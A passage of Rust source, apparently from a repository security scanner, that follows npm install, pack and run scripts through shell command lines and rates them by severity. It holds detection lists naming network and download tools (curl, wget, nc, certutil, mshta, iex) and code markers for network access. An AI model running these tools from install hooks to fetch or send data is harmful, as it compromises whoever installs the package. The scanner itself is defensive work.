//! Rules `deps.npm-lifecycle-hook` and `run.npm-script-local-server`: the code
//! npm runs from a `package.json`.
//!
//! What npm runs, checked against the npm scripts documentation (v11):
//!
//! - `npm install` and `npm ci` in a project run `preinstall`, `install`,
//!   `postinstall`, `prepublish` (deprecated, but still run), `preprepare`,
//!   `prepare`, `postprepare`, and `dependencies` (run whenever `node_modules`
//!   changes), each with its `pre` and `post` variants. A dependency's own
//!   `package.json` runs the same install hooks when it is installed, so every
//!   `package.json` in the repository is read, `node_modules` included.
//! - `prepack`, `postpack`, `prepublishOnly`, `publish` and `postpublish` run
//!   on `npm pack` / `npm publish` and when the repository is installed as a
//!   git dependency, not on a plain install of the root. They are reported one
//!   level lower.
//! - `npm start` runs `node server.js` when there is no `start` script and a
//!   `server.js` exists.
//!
//! The file is read as `JSON.parse` reads it (see `jsonc::parse_json`): the
//! last duplicate key wins, a byte order mark is dropped, comments and
//! trailing commas are errors. npm refuses a file it cannot parse, so such a
//! file is reported LOW and explained.
//!
//! A script is a shell command line, so each hook is resolved the way it would
//! run: the command line is split at `&&`, `||`, `;`, `|`, `&` and newlines
//! (quotes respected), `$(...)` and backticks are read as commands too, and
//! `npm run X`, `npm start/test`, `yarn X`, `pnpm X`, `bun run X`,
//! `npm-run-all`, `run-p`, `run-s`, `concurrently`, wrappers such as
//! `cross-env` and `npx`, and `cd dir && npm install` into another manifest of
//! the repository are followed, with a depth limit, a step budget and a cycle
//! guard. The level of a hook is the highest level found anywhere in its chain.
//! A chain the limits cut short is never reported as clean.
//!
//! Known gaps, tracked in the issue: the implicit `node-gyp rebuild`, `<!(...)`
//! in `binding.gyp`, `.npmrc` and `.yarnrc.yml`, workspace selection with
//! `--workspace` or `--filter` (the other manifest is reported on its own),
//! and shell features beyond the above (variables, functions, aliases).

use std::collections::{BTreeMap, HashMap, HashSet};
use std::rc::Rc;

use regex::Regex;

use super::{Ctx, FileIssue, Hit, RepoIndex, TextSpan};
use crate::finding::Severity;
use crate::jsonc::{self, Node, Value};
use crate::sanitize::display_safe;

/// Scripts calling scripts are followed this many levels.
const MAX_DEPTH: usize = 10;

/// At most this many script and command-line expansions per `package.json`.
const MAX_STEPS: usize = 2000;

/// Words taken from the file are cut to this many characters in a report.
const MAX_WORD_CHARS: usize = 60;

/// The script names npm runs on `npm install` or `npm ci` of a project, with
/// the `pre` and `post` variants npm adds to every event.
const INSTALL_HOOKS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "preprepublish",
    "prepublish",
    "postprepublish",
    "preprepare",
    "prepare",
    "postprepare",
    "predependencies",
    "dependencies",
    "postdependencies",
];

/// Hooks npm runs on pack and publish, and when the repository is installed
/// as a git dependency, but not on a plain install of the root.
const PACK_HOOKS: &[&str] = &[
    "preprepack",
    "prepack",
    "postpack",
    "prepublishOnly",
    "publish",
    "postpublish",
];

/// Hooks npm runs for `npm pack` and `npm publish`, in this order.
const PACK_CHAIN: &[&str] = &["prepack", "prepare", "postpack"];
const PUBLISH_CHAIN: &[&str] = &[
    "prepublishOnly",
    "prepack",
    "prepare",
    "postpack",
    "publish",
    "postpublish",
];

/// Scripts a developer runs by name, with their `pre` and `post` variants.
const RUN_SCRIPTS: &[&str] = &[
    "prestart",
    "start",
    "poststart",
    "predev",
    "dev",
    "postdev",
    "prebuild",
    "build",
    "postbuild",
    "pretest",
    "test",
    "posttest",
];

/// Tools that build or serve a front end. A local node program run next to one
/// of them is the full-stack pattern, honest or not.
const FRONTEND: &[&str] = &[
    "react-scripts",
    "react-app-rewired",
    "craco",
    "vite",
    "next",
    "nuxt",
    "nuxi",
    "webpack",
    "webpack-dev-server",
    "webpack-cli",
    "vue-cli-service",
    "ng",
    "parcel",
    "gatsby",
    "svelte-kit",
    "astro",
    "snowpack",
    "rollup",
    "expo",
    "remix",
    "storybook",
    "start-storybook",
    "docusaurus",
    "vuepress",
    "ember",
    "preact",
    "wmr",
    "quasar",
    "eleventy",
];

/// Tools that ordinary projects run from an install hook or a build. Each is
/// reported INFO: the hook exists, and it is one of these. A program that is
/// not on a list is only as honest as its name, which the attacker chooses, so
/// the list is explicit and short.
const HONEST: &[&str] = &[
    "husky",
    "lefthook",
    "simple-git-hooks",
    "patch-package",
    "postinstall-postinstall",
    "node-gyp",
    "node-gyp-build",
    "electron-rebuild",
    "electron-builder",
    "ngcc",
    "ngc",
    "tsc",
    "tsc-alias",
    "tsup",
    "esbuild",
    "babel",
    "gulp",
    "grunt",
    "rimraf",
    "mkdirp",
    "shx",
    "cpy",
    "copyfiles",
    "ncp",
    "del-cli",
    "only-allow",
    "opencollective-postinstall",
    "is-ci",
    "prisma",
    "sass",
    "postcss",
    "lessc",
    "jest",
    "mocha",
    "vitest",
    "eslint",
    "prettier",
    "stylelint",
    "lint-staged",
    "pretty-quick",
    "commitlint",
    "tslint",
    "lerna",
    "git",
    "wait-on",
    "sleep",
    "ts-patch",
    "svelte-check",
    "vue-tsc",
    "nuxt-ts",
    "panda",
    "typedoc",
    "bower",
    "yarn-deduplicate",
    "syncpack",
    "cross-env",
];

/// Honest tools that download binaries when they run: LOW, not INFO.
const HONEST_DOWNLOAD: &[&str] = &[
    "prebuild-install",
    "node-pre-gyp",
    "playwright",
    "puppeteer",
    "cypress",
    "cmake-js",
    "electron-download",
    "download-chromium",
];

/// Commands that fetch or send data over the network, or run a remote script.
const NETWORK: &[&str] = &[
    "curl",
    "wget",
    "iwr",
    "irm",
    "invoke-webrequest",
    "invoke-restmethod",
    "invoke-expression",
    "iex",
    "certutil",
    "bitsadmin",
    "start-bitstransfer",
    "mshta",
    "regsvr32",
    "rundll32",
    "nc",
    "ncat",
    "netcat",
    "telnet",
    "ftp",
    "tftp",
];

/// Commands that do nothing a hook could be accused of.
const QUIET: &[&str] = &[
    "echo", "exit", "true", "false", ":", "test", "[", "[[", "pwd", "mkdir", "rm", "rmdir", "cp",
    "mv", "ls", "touch", "set", "export", "unset", "printf", "cat", "chmod", "ln", "type", "del",
    "copy", "move", "rd", "md", "if", "then", "fi", "else", "do", "done", "for", "while", "rem",
    "title", "pause", "cls", "clear", "which", "where", "date", "sleep", "read", "shift", "umask",
    "ulimit", "wait", "trap",
];

/// Wrappers that run the rest of the command line.
const WRAPPERS: &[&str] = &[
    "cross-env",
    "cross-env-shell",
    "env",
    "sudo",
    "nice",
    "time",
    "exec",
    "command",
    "nohup",
    "call",
    "start",
    "npm-run-env",
];

/// Words in inline code that mean it reaches the network.
const NETWORK_MARKERS: &[&str] = &[
    "http:",
    "https:",
    "ftp:",
    "fetch(",
    "xmlhttprequest",
    "require('http",
    "require(\"http",
    "require('net",
    "require(\"net",
    "net.connect",
    "net.socket",
    "urllib",
    "urlopen",
    "requests.",
    "http.client",
    "socket",
    "curl",
    "wget",
    "invoke-webrequest",
    "downloadstring",
    "downloadfile",
    "iwr ",
    "irm ",
    "from http",
    "import http",
];

/// Commands of yarn, pnpm and bun that are not scripts.
const PM_BUILTINS: &[&str] = &[
    "install",
    "i",
    "add",
    "remove",
    "rm",
    "un",
    "uninstall",
    "up",
    "upgrade",
    "update",
    "init",
    "link",
    "unlink",
    "pack",
    "publish",
    "version",
    "info",
    "list",
    "ls",
    "why",
    "audit",
    "cache",
    "config",
    "bin",
    "global",
    "outdated",
    "owner",
    "tag",
    "team",
    "plugin",
    "set",
    "dedupe",
    "explain",
    "rebuild",
    "rb",
    "patch",
    "patch-commit",
    "store",
    "prune",
    "create",
    "env",
    "deploy",
    "fetch",
    "import",
    "unplug",
    "constraints",
    "workspace",
    "workspaces",
    "dlx",
    "exec",
    "node",
    "run",
    "run-script",
    "help",
    "login",
    "logout",
    "whoami",
    "licenses",
    "doctor",
    "approve-builds",
    "self-update",
    "check",
    "generate-lock-entry",
    "policies",
    "stage",
];

// ---------------------------------------------------------------- manifest

/// One script of a `package.json`.
#[derive(Debug, Clone)]
struct Script {
    value: String,
    offset: usize,
    end: usize,
}

/// What the check needs from a `package.json`.
#[derive(Debug, Default)]
struct Manifest {
    /// The scripts npm sees: the last `scripts` key, the last of each name.
    scripts: BTreeMap<String, Script>,
    /// Hook definitions npm ignores because the same key appears again later.
    shadowed: Vec<(String, Script)>,
    /// `scripts` appears more than once.
    duplicate_scripts: bool,
    main: Option<String>,
    deps: HashSet<String>,
}

fn is_hook_name(name: &str) -> bool {
    INSTALL_HOOKS.contains(&name) || PACK_HOOKS.contains(&name)
}

fn script_of(node: &Node) -> Option<Script> {
    Some(Script {
        value: node.as_str()?.to_string(),
        offset: node.offset,
        end: node.end,
    })
}

fn manifest_of(root: &Node) -> Manifest {
    let mut manifest = Manifest::default();
    let Value::Object(members) = &root.value else {
        return manifest;
    };
    let scripts_keys: Vec<&Node> = members
        .iter()
        .filter(|m| m.key == "scripts")
        .map(|m| &m.value)
        .collect();
    manifest.duplicate_scripts = scripts_keys.len() > 1;
    // Earlier `scripts` objects are replaced as a whole.
    for earlier in scripts_keys.iter().rev().skip(1) {
        if let Value::Object(entries) = &earlier.value {
            for entry in entries {
                if is_hook_name(&entry.key)
                    && let Some(script) = script_of(&entry.value)
                {
                    manifest.shadowed.push((entry.key.clone(), script));
                }
            }
        }
    }
    if let Some(Value::Object(entries)) = scripts_keys.last().map(|n| &n.value) {
        for (index, entry) in entries.iter().enumerate() {
            let Some(script) = script_of(&entry.value) else {
                // npm would see a non-string; it runs nothing for it, and an
                // earlier string under the same key is replaced by it.
                manifest.scripts.remove(&entry.key);
                continue;
            };
            let later = entries[index + 1..].iter().any(|e| e.key == entry.key);
            if later {
                if is_hook_name(&entry.key) {
                    manifest.shadowed.push((entry.key.clone(), script));
                }
            } else {
                manifest.scripts.insert(entry.key.clone(), script);
            }
        }
    }
    manifest.main = root.get("main").and_then(Node::as_str).map(str::to_string);
    for key in [
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
    ] {
        if let Some(Node {
            value: Value::Object(deps),
            ..
        }) = root.get(key)
        {
            manifest.deps.extend(deps.iter().map(|d| d.key.clone()));
        }
    }
    manifest
}

/// The folder of a repository path (`""` for the root).
fn dir_of(path: &str) -> &str {
    path.rsplit_once('/').map_or("", |(dir, _)| dir)
}

fn join(dir: &str, rel: &str) -> String {
    if dir.is_empty() {
        rel.to_string()
    } else {
        format!("{dir}/{rel}")
    }
}

/// `rel` as a path from the repository root, resolved against `dir`, or `None`
/// when it is absolute, uses a variable or leaves the repository.
fn resolve(dir: &str, rel: &str) -> Option<String> {
    let rel = rel.replace('\\', "/");
    if rel.starts_with('/')
        || rel.starts_with('~')
        || rel.contains(['$', '%', '`'])
        || rel.chars().nth(1) == Some(':')
    {
        return None;
    }
    let mut parts: Vec<&str> = dir.split('/').filter(|p| !p.is_empty()).collect();
    for part in rel.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            other => parts.push(other),
        }
    }
    Some(parts.join("/"))
}

// ------------------------------------------------------------------ outcome

/// What resolving a script (or a piece of one) found.
#[derive(Debug, Default, Clone)]
struct Outcome {
    /// The highest level found, or `None` when nothing is worth saying.
    sev: Option<Severity>,
    /// Why, for the highest level.
    why: String,
    /// A limit stopped the resolution before the end.
    truncated: bool,
    /// A script called itself, directly or not.
    cycle: bool,
    /// Local files started by a node-like program.
    node_files: Vec<String>,
    /// A front-end tool found in the chain.
    frontend: Option<String>,
}

impl Outcome {
    fn raise(&mut self, sev: Severity, why: String) {
        if self.sev.is_none_or(|current| sev > current) {
            self.sev = Some(sev);
            self.why = why;
        }
    }

    /// Takes what a called script found; `via` names the call in the reason.
    fn absorb(&mut self, child: Outcome, via: &str) {
        if let Some(sev) = child.sev {
            self.raise(sev, format!("{via}: {}", child.why));
        }
        self.truncated |= child.truncated;
        self.cycle |= child.cycle;
        for file in child.node_files {
            if !self.node_files.contains(&file) && self.node_files.len() < 8 {
                self.node_files.push(file);
            }
        }
        if self.frontend.is_none() {
            self.frontend = child.frontend;
        }
    }
}

fn short(word: &str) -> String {
    display_safe(word, MAX_WORD_CHARS)
}

// --------------------------------------------------------------- shell text

/// Splits a shell command line into simple commands (each a list of words, with
/// quotes removed) and the texts of `$(...)` and backtick substitutions.
/// `&&`, `||`, `;`, `|`, `&`, newlines and parentheses end a command; an `&`
/// that is part of a redirection (`2>&1`, `&>`) does not. Backslashes are kept,
/// since on Windows they are path separators.
fn split_shell(text: &str) -> (Vec<Vec<String>>, Vec<String>) {
    struct State {
        segments: Vec<Vec<String>>,
        words: Vec<String>,
        word: String,
        in_word: bool,
    }
    impl State {
        fn word_end(&mut self) {
            if self.in_word {
                self.words.push(std::mem::take(&mut self.word));
                self.in_word = false;
            }
        }
        fn segment_end(&mut self) {
            self.word_end();
            if !self.words.is_empty() {
                self.segments.push(std::mem::take(&mut self.words));
            }
        }
    }
    let chars: Vec<char> = text.chars().collect();
    let mut st = State {
        segments: Vec::new(),
        words: Vec::new(),
        word: String::new(),
        in_word: false,
    };
    let mut subs = Vec::new();
    let (mut single, mut double) = (false, false);
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if single {
            if c == '\'' {
                single = false;
            } else {
                st.word.push(c);
            }
            i += 1;
            continue;
        }
        if c == '$' && chars.get(i + 1) == Some(&'(') {
            let mut depth = 0usize;
            let mut j = i + 1;
            while j < chars.len() {
                match chars[j] {
                    '(' => depth += 1,
                    ')' => {
                        depth -= 1;
                        if depth == 0 {
                            break;
                        }
                    }
                    _ => {}
                }
                j += 1;
            }
            let end = j.min(chars.len() - 1);
            subs.push(chars[i + 2..end.max(i + 2)].iter().collect());
            st.word.extend(&chars[i..=end]);
            st.in_word = true;
            i = end + 1;
            continue;
        }
        if c == '`' {
            let end = chars[i + 1..]
                .iter()
                .position(|&x| x == '`')
                .map_or(chars.len() - 1, |p| i + 1 + p);
            subs.push(chars[i + 1..end.max(i + 1)].iter().collect());
            st.word.extend(&chars[i..=end]);
            st.in_word = true;
            i = end + 1;
            continue;
        }
        if double {
            if c == '"' {
                double = false;
            } else if c == '\\' && chars.get(i + 1) == Some(&'"') {
                st.word.push('"');
                i += 1;
            } else {
                st.word.push(c);
            }
            i += 1;
            continue;
        }
        match c {
            '\'' => {
                single = true;
                st.in_word = true;
            }
            '"' => {
                double = true;
                st.in_word = true;
            }
            ' ' | '\t' | '\r' => st.word_end(),
            '\n' | ';' | '|' | '(' | ')' => st.segment_end(),
            '&' => {
                let redirect = matches!(i.checked_sub(1).map(|p| chars[p]), Some('>' | '<'))
                    || chars.get(i + 1) == Some(&'>');
                if redirect {
                    st.word.push(c);
                    st.in_word = true;
                } else {
                    st.segment_end();
                }
            }
            _ => {
                st.word.push(c);
                st.in_word = true;
            }
        }
        i += 1;
    }
    st.segment_end();
    (st.segments, subs)
}

fn is_env_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && !name.starts_with(|c: char| c.is_ascii_digit())
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// A program name as the shell would find it: lowercase, without quotes,
/// carets, directories and `.exe` / `.cmd`.
fn tool_name(word: &str) -> String {
    let lower = word
        .trim_matches(['"', '\''])
        .replace('^', "")
        .to_lowercase();
    let base = lower.rsplit(['/', '\\']).next().unwrap_or(&lower);
    for suffix in [".exe", ".cmd"] {
        if let Some(stripped) = base.strip_suffix(suffix) {
            return stripped.to_string();
        }
    }
    base.to_string()
}

const SCRIPT_EXTENSIONS: &[&str] = &[
    ".js", ".mjs", ".cjs", ".ts", ".mts", ".cts", ".jsx", ".tsx", ".py", ".sh", ".bat", ".cmd",
    ".ps1", ".rb", ".pl", ".php", ".vbs", ".wsf", ".hta",
];

fn looks_like_file(word: &str) -> bool {
    let lower = word.to_lowercase();
    word.contains(['/', '\\']) || SCRIPT_EXTENSIONS.iter().any(|e| lower.ends_with(e))
}

fn has_network_marker(code: &str) -> bool {
    let lower = code.to_lowercase();
    NETWORK_MARKERS.iter().any(|m| lower.contains(m))
}

/// Whether `pattern` (`*` stays inside one `:` segment, `**` crosses them)
/// matches a script name, as `npm-run-all` and `concurrently` read it.
fn glob_matches(pattern: &str, name: &str) -> bool {
    if !pattern.contains('*') {
        return pattern == name;
    }
    let mut regex = String::from("^");
    let mut rest = pattern;
    while !rest.is_empty() {
        if let Some(tail) = rest.strip_prefix("**") {
            regex.push_str(".*");
            rest = tail;
        } else if let Some(tail) = rest.strip_prefix('*') {
            regex.push_str("[^:]*");
            rest = tail;
        } else {
            let mut chars = rest.chars();
            let c = chars.next().unwrap_or_default();
            regex.push_str(&regex::escape(&c.to_string()));
            rest = chars.as_str();
        }
    }
    regex.push('$');
    Regex::new(&regex).is_ok_and(|re| re.is_match(name))
}

/// Whether a front-end tool called with these arguments starts a server that
/// does not exit, as `react-scripts start`, `vite` or `next dev` do.
fn starts_dev_server(tool: &str, args: &[String]) -> bool {
    let first = args
        .iter()
        .find(|a| !a.starts_with('-'))
        .map(String::as_str);
    match tool {
        "webpack-dev-server" | "start-storybook" | "wmr" => true,
        "react-scripts" | "react-app-rewired" | "craco" => first == Some("start"),
        "vite" | "parcel" => !matches!(first, Some("build" | "optimize")),
        "next" => matches!(first, Some("dev" | "start")),
        "webpack" => matches!(first, Some("serve" | "watch" | "s" | "server")),
        "ng" => matches!(first, Some("serve" | "s")),
        "nuxt" | "nuxi" => matches!(first, Some("dev" | "start" | "preview")),
        "vue-cli-service" => first == Some("serve"),
        "gatsby" => matches!(first, Some("develop" | "serve")),
        "astro" | "svelte-kit" | "storybook" | "vuepress" | "quasar" => {
            matches!(first, Some("dev" | "preview" | "serve"))
        }
        "expo" | "docusaurus" => matches!(first, Some("start" | "serve")),
        "remix" => matches!(first, Some("dev" | "dev-server")),
        "ember" => matches!(first, Some("serve" | "s")),
        _ => false,
    }
}

/// A front-end tool loads the project's own configuration file (`vite.config.js`,
/// `next.config.js`, `webpack.config.js`, ...) as code, so running it runs a
/// file of the repository. A dev server in an install hook never exits, which
/// no honest install hook wants.
fn frontend_outcome(tool: &str, args: &[String], out: &mut Outcome) {
    if starts_dev_server(tool, args) {
        out.raise(
            Severity::Medium,
            format!(
                "starts the {} dev server, which does not exit and runs the project's own \
                 configuration file as code",
                short(tool)
            ),
        );
    } else {
        out.raise(
            Severity::Low,
            format!(
                "runs {}, which runs the project's own configuration file as code",
                short(tool)
            ),
        );
    }
}

// ----------------------------------------------------------------- resolver

struct Resolver<'a> {
    repo: &'a RepoIndex,
    manifests: HashMap<String, Option<Rc<Manifest>>>,
    /// The folder of the `package.json` being checked.
    home: String,
    steps: usize,
}

type Stack = Vec<(String, String)>;

/// What a package manager command line asks for.
enum Action {
    Run(String),
    Install,
    Pack,
    Publish,
    Exec(Vec<String>),
    Dlx(Vec<String>),
    NodeArgs(Vec<String>),
    Nothing,
}

impl<'a> Resolver<'a> {
    fn new(repo: &'a RepoIndex, own_dir: &str, own: Manifest) -> Self {
        let mut manifests = HashMap::new();
        manifests.insert(own_dir.to_string(), Some(Rc::new(own)));
        Resolver {
            repo,
            manifests,
            home: own_dir.to_string(),
            steps: 0,
        }
    }

    fn manifest(&mut self, dir: &str) -> Option<Rc<Manifest>> {
        if let Some(known) = self.manifests.get(dir) {
            return known.clone();
        }
        let path = join(dir, "package.json");
        let parsed = self.repo.manifest(&path).and_then(|bytes| {
            let text = String::from_utf8_lossy(bytes);
            jsonc::parse_json(&text)
                .ok()
                .map(|root| Rc::new(manifest_of(&root)))
        });
        self.manifests.insert(dir.to_string(), parsed.clone());
        parsed
    }

    fn exists(&self, path: &str) -> bool {
        self.repo.contains_path(path)
    }

    /// Runs script `name` of the manifest in `dir`, with its `pre` and `post`.
    fn run_named(&mut self, dir: &str, name: &str, depth: usize, stack: &mut Stack) -> Outcome {
        let mut out = Outcome::default();
        for variant in [
            format!("pre{name}"),
            name.to_string(),
            format!("post{name}"),
        ] {
            let child = self.script(dir, &variant, depth, stack);
            out.absorb(child, &format!("script \"{variant}\""));
        }
        if out.sev.is_none()
            && name == "start"
            && let Some(manifest) = self.manifest(dir)
            && !manifest.scripts.contains_key("start")
        {
            let server = join(dir, "server.js");
            if self.exists(&server) {
                out.raise(
                    Severity::Medium,
                    format!("npm start runs the local file {server} when there is no start script"),
                );
                out.node_files.push(server);
            }
        }
        out
    }

    /// One script by its exact name.
    fn script(&mut self, dir: &str, name: &str, depth: usize, stack: &mut Stack) -> Outcome {
        let mut out = Outcome::default();
        self.steps += 1;
        if depth > MAX_DEPTH || self.steps > MAX_STEPS {
            out.truncated = true;
            return out;
        }
        let key = (dir.to_string(), name.to_string());
        if stack.contains(&key) {
            out.cycle = true;
            return out;
        }
        let Some(manifest) = self.manifest(dir) else {
            return out;
        };
        let Some(script) = manifest.scripts.get(name) else {
            return out;
        };
        stack.push(key);
        out = self.text(dir, &script.value, depth + 1, stack);
        stack.pop();
        out
    }

    /// The install hooks (or any named hooks) of the manifest in `dir`.
    fn hooks(
        &mut self,
        dir: &str,
        names: &[&str],
        label: &str,
        depth: usize,
        stack: &mut Stack,
    ) -> Outcome {
        let mut out = Outcome::default();
        let key = (dir.to_string(), format!("<{label}>"));
        if stack.contains(&key) {
            out.cycle = true;
            return out;
        }
        stack.push(key);
        let place = if dir.is_empty() {
            "the root package.json".to_string()
        } else {
            format!("{}/package.json", short(dir))
        };
        for name in names {
            let child = self.script(dir, name, depth, stack);
            out.absorb(child, &format!("{place} hook \"{name}\""));
        }
        stack.pop();
        out
    }

    /// A shell command line.
    fn text(&mut self, dir: &str, text: &str, depth: usize, stack: &mut Stack) -> Outcome {
        let mut out = Outcome::default();
        self.steps += 1;
        if depth > MAX_DEPTH + 2 || self.steps > MAX_STEPS {
            out.truncated = true;
            return out;
        }
        let (segments, subs) = split_shell(text);
        let mut cwd = dir.to_string();
        for words in &segments {
            self.command(&mut cwd, words, depth, stack, &mut out);
        }
        for sub in subs {
            let child = self.text(&cwd, &sub, depth + 1, stack);
            out.absorb(child, "a command substitution");
        }
        out
    }

    fn command(
        &mut self,
        cwd: &mut String,
        words: &[String],
        depth: usize,
        stack: &mut Stack,
        out: &mut Outcome,
    ) {
        let mut start = 0;
        while words.get(start).is_some_and(|w| is_env_assignment(w)) {
            start += 1;
        }
        let words = &words[start..];
        let Some(first) = words.first() else {
            return;
        };
        let args = &words[1..];
        let name = tool_name(first);

        if matches!(name.as_str(), "cd" | "pushd" | "chdir") {
            let target = args
                .iter()
                .find(|a| !a.starts_with('-') && !a.starts_with('/'));
            if let Some(target) = target {
                // An unresolvable directory leaves later commands without a
                // manifest to follow into, nothing more.
                *cwd = resolve(cwd, target).unwrap_or_else(|| "?outside".to_string());
            }
            return;
        }
        if QUIET.contains(&name.as_str()) {
            return;
        }
        if first.contains(['/', '\\']) && !first.starts_with(['$', '%']) {
            // A path: a file of the repository, or a tool outside it.
            if let Some(path) = resolve(cwd, first) {
                if self.exists(&path) || !path.contains("node_modules/.bin/") {
                    self.local_file(&path, out, false);
                    return;
                }
            } else if !(first.starts_with('/') || first.chars().nth(1) == Some(':')) {
                out.raise(
                    Severity::Low,
                    format!("runs {}, which is outside the repository", short(first)),
                );
                return;
            }
        } else if looks_like_file(first)
            && let Some(path) = resolve(cwd, first)
            && self.exists(&path)
        {
            self.local_file(&path, out, false);
            return;
        }

        if FRONTEND.contains(&name.as_str()) && out.frontend.is_none() {
            out.frontend = Some(name.clone());
        }
        let name = name.as_str();

        if NETWORK.contains(&name) {
            out.raise(
                Severity::Critical,
                format!(
                    "runs {}, which downloads or sends data over the network",
                    short(name)
                ),
            );
            return;
        }
        if WRAPPERS.contains(&name) {
            let rest: Vec<String> = args
                .iter()
                .skip_while(|a| a.starts_with('-') || is_env_assignment(a))
                .cloned()
                .collect();
            self.command(cwd, &rest, depth, stack, out);
            return;
        }
        match name {
            "dotenv" | "dotenv-cli" | "dotenvx" | "env-cmd" => {
                let rest: Vec<String> = match args.iter().position(|a| a == "--") {
                    Some(at) => args[at + 1..].to_vec(),
                    None => {
                        let mut skip = false;
                        args.iter()
                            .filter(|a| {
                                if skip {
                                    skip = false;
                                    return false;
                                }
                                if matches!(a.as_str(), "-f" | "-e" | "-r" | "--file" | "-p") {
                                    skip = true;
                                    return false;
                                }
                                !a.starts_with('-')
                            })
                            .cloned()
                            .collect()
                    }
                };
                self.command(cwd, &rest, depth, stack, out);
            }
            "npm" | "pnpm" | "yarn" | "bun" | "npx" | "pnpx" | "bunx" => {
                self.package_manager(cwd, name, args, depth, stack, out);
            }
            "npm-run-all" | "npm-run-all2" | "run-s" | "run-p" | "run-all" => {
                self.run_all(cwd, args, depth, stack, out);
            }
            "concurrently" | "conc" => self.concurrently(cwd, args, depth, stack, out),
            "node" | "nodejs" | "nodemon" | "ts-node" | "ts-node-dev" | "tsx" | "babel-node"
            | "esno" | "electron" | "deno" => {
                self.node_like(cwd, name, args, depth, stack, out);
            }
            "python" | "python2" | "python3" | "py" | "ruby" | "perl" | "php" | "lua"
            | "rscript" | "cscript" | "wscript" => self.interpreter(cwd, name, args, out),
            "bash" | "sh" | "zsh" | "dash" | "ksh" | "fish" => {
                self.shell(cwd, name, args, depth, stack, out);
            }
            "cmd" => self.cmd(cwd, args, depth, stack, out),
            "powershell" | "pwsh" | "powershell_ise" => {
                self.powershell(cwd, args, depth, stack, out);
            }
            "eval" | "base64" | "source" | "." => out.raise(
                Severity::High,
                format!(
                    "runs {}, which runs or decodes code from a string",
                    short(name)
                ),
            ),
            _ => self.other(cwd, first, name, args, out),
        }
    }

    /// A program with no special handling: honest, or unknown.
    fn other(&mut self, _cwd: &str, first: &str, name: &str, args: &[String], out: &mut Outcome) {
        if HONEST_DOWNLOAD.contains(&name) {
            out.raise(
                Severity::Low,
                format!(
                    "runs {}, a known tool that downloads prebuilt binaries",
                    short(name)
                ),
            );
            return;
        }
        if let Some(url) = args
            .iter()
            .chain([&first.to_string()])
            .find(|a| a.contains("://"))
        {
            out.raise(
                Severity::Critical,
                format!(
                    "passes {} to {}, which fetches code from the network",
                    short(url),
                    short(name)
                ),
            );
            return;
        }
        if FRONTEND.contains(&name) {
            frontend_outcome(name, args, out);
            return;
        }
        if HONEST.contains(&name) {
            out.raise(
                Severity::Info,
                format!("runs {}, a tool ordinary projects run here", short(name)),
            );
            return;
        }
        out.raise(
            Severity::Low,
            format!(
                "runs {}, a program this scanner has no opinion on",
                short(name)
            ),
        );
    }

    /// A file of the repository run by a program.
    fn local_file(&mut self, path: &str, out: &mut Outcome, node: bool) {
        let note = if self.exists(path) {
            ""
        } else {
            ", which is not in the repository (something must create or download it first)"
        };
        out.raise(
            Severity::Medium,
            format!("runs the local file {}{note}", short(path)),
        );
        if node && !out.node_files.iter().any(|f| f == path) && out.node_files.len() < 8 {
            out.node_files.push(path.to_string());
        }
    }

    fn inline(&mut self, who: &str, code: &str, out: &mut Outcome) {
        if has_network_marker(code) {
            out.raise(
                Severity::Critical,
                format!("runs inline code ({who}) that downloads or sends data over the network"),
            );
        } else {
            out.raise(Severity::High, format!("runs inline code ({who})"));
        }
    }

    /// `node`, `nodemon`, `ts-node`, `tsx`, ...: a file or inline code.
    fn node_like(
        &mut self,
        cwd: &str,
        name: &str,
        args: &[String],
        depth: usize,
        stack: &mut Stack,
        out: &mut Outcome,
    ) {
        const VALUE_FLAGS: &[&str] = &[
            "-r",
            "--require",
            "--import",
            "--loader",
            "--experimental-loader",
            "-C",
            "--conditions",
            "--env-file",
            "--input-type",
            "--title",
            "-w",
            "--watch",
            "--ext",
            "--ignore",
            "-i",
            "--delay",
            "--config",
            "-P",
            "--project",
            "--tsconfig",
            "--signal",
            "--cwd",
            "--inspect-port",
            "--max-old-space-size-percentage",
        ];
        let mut i = 0;
        while i < args.len() {
            let arg = args[i].as_str();
            let flag = arg.split('=').next().unwrap_or(arg);
            match arg {
                "-e" | "--eval" | "-p" | "--print" if name != "nodemon" => {
                    if let Some(code) = args.get(i + 1) {
                        self.inline(&format!("{name} {arg}"), code, out);
                    } else {
                        out.raise(Severity::High, format!("runs inline code ({name} {arg})"));
                    }
                    return;
                }
                "-x" | "--exec" if name == "nodemon" => {
                    if let Some(command) = args.get(i + 1) {
                        let child = self.text(cwd, command, depth + 1, stack);
                        out.absorb(child, "nodemon --exec");
                    }
                    i += 2;
                    continue;
                }
                "--" => {
                    i += 1;
                    break;
                }
                "run" | "task" if name == "deno" => {
                    i += 1;
                    continue;
                }
                _ => {}
            }
            if arg.starts_with('-') {
                i += if !arg.contains('=') && VALUE_FLAGS.contains(&flag) {
                    2
                } else {
                    1
                };
            } else {
                break;
            }
        }
        let Some(target) = args.get(i) else { return };
        if target.contains("://") {
            out.raise(
                Severity::Critical,
                format!("runs {} from the network with {name}", short(target)),
            );
            return;
        }
        if target == "." {
            let main = self
                .manifest(cwd)
                .and_then(|m| m.main.clone())
                .unwrap_or_else(|| "index.js".to_string());
            if let Some(path) = resolve(cwd, &main) {
                self.local_file(&path, out, true);
            }
            return;
        }
        match resolve(cwd, target) {
            Some(path) => self.local_file(&path, out, true),
            None => out.raise(
                Severity::Low,
                format!(
                    "runs {} with {name}, a file outside the repository",
                    short(target)
                ),
            ),
        }
    }

    /// `python`, `ruby`, `perl`, ...: a file or inline code.
    fn interpreter(&mut self, cwd: &str, name: &str, args: &[String], out: &mut Outcome) {
        let inline_flag = match name {
            "python" | "python2" | "python3" | "py" => "-c",
            "php" => "-r",
            "rscript" => "-e",
            _ => "-e",
        };
        let mut i = 0;
        while i < args.len() {
            let arg = args[i].as_str();
            if arg == inline_flag {
                let code = args.get(i + 1).map_or("", String::as_str);
                self.inline(&format!("{name} {arg}"), code, out);
                return;
            }
            if arg == "-m" {
                let module = args.get(i + 1).map_or("", String::as_str);
                if matches!(
                    module,
                    "pip" | "ensurepip" | "venv" | "build" | "setuptools"
                ) {
